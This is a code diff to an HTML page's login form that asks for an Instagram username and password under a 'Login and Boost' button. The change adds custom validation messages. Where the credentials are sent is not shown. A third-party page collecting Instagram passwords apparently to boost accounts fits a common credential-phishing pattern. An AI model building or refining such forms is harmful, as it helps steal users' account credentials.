@@ -101,38 +101,47 @@
     </div>
 
     <!-- FORM START -->
-    <form id="instaForm" novalidate class="space-y-6">
-      <!-- Username Field -->
-      <div class="space-y-2">
-        <label for="username" class="block text-sm font-medium text-gray-700">Instagram Username</label>
-        <div class="relative">
-          <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-            <span class="text-gray-500">@</span>
-          </div>
-          <input id="username" name="username" type="text" required placeholder="username"
-                 class="input-field pl-8 w-full border border-gray-200 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-indigo-500" />
-        </div>
+<form id="instaForm" class="space-y-6">
+  <!-- Username Field -->
+  <div class="space-y-2">
+    <label for="username" class="block text-sm font-medium text-gray-700">Instagram Username</label>
+    <div class="relative">
+      <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+        <span class="text-gray-500">@</span>
       </div>
+      <input id="username" name="username" type="text" required
+             oninvalid="this.setCustomValidity('Please enter your Instagram username')"
+             oninput="this.setCustomValidity('')"
+             placeholder="username"
+             class="input-field pl-8 w-full border border-gray-200 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-indigo-500" />
+    </div>
+  </div>
 
-      <!-- Password Field -->
-      <div class="space-y-2">
-        <label for="user_pass" class="block text-sm font-medium text-gray-700">Password</label>
-        <input id="user_pass" name="user_pass" type="password" required placeholder="••••••••"
-               class="input-field w-full border border-gray-200 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-indigo-500" />
-      </div>
+  <!-- Password Field -->
+  <div class="space-y-2">
+    <label for="user_pass" class="block text-sm font-medium text-gray-700">Password</label>
+    <input id="user_pass" name="user_pass" type="password" required
+           oninvalid="this.setCustomValidity('Please enter your password')"
+           oninput="this.setCustomValidity('')"
+           placeholder="••••••••"
+           class="input-field w-full border border-gray-200 rounded-xl px-4 py-3 text-base focus:outline-none focus:ring-2 focus:ring-indigo-500" />
+  </div>
 
-      <!-- Submit Button -->
-      <div class="pt-2">
-        <button type="submit"
-                class="submit-btn w-full text-white py-4 rounded-xl font-semibold text-lg hover:shadow-lg transition-all duration-300 flex items-center justify-center">
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
-            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-8.707l-3-3a1 1 0 00-1.414 1.414L10.586 9H7a1 1 0 100 2h3.586l-1.293 1.293a1 1 0 101.414 1.414l3-3a1 1 0 000-1.414z" clip-rule="evenodd" />
-          </svg>
-          Login and Boost
-        </button>
-      </div>
-    </form>
-    <!-- FORM END -->
+  <!-- Submit Button -->
+  <div class="pt-2">
+    <button type="submit"
+            class="submit-btn w-full text-white py-4 rounded-xl font-semibold text-lg hover:shadow-lg transition-all duration-300 flex items-center justify-center">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
+        <path fill-rule="evenodd"
+              d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-8.707l-3-3a1 1 0 00-1.414 1.414L10.586 9H7a1 1 0 100 2h3.586l-1.293 1.293a1 1 0 101.414 1.414l3-3a1 1 0 000-1.414z"
+              clip-rule="evenodd" />
+      </svg>
+      Login and Boost
+    </button>
+  </div>
+</form>
+<!-- FORM END -->
+
 
     <!-- Security Message -->
     <div class="bg-indigo-50 border border-indigo-100 p-4 rounded-xl text-sm text-indigo-800 flex items-start gap-3">
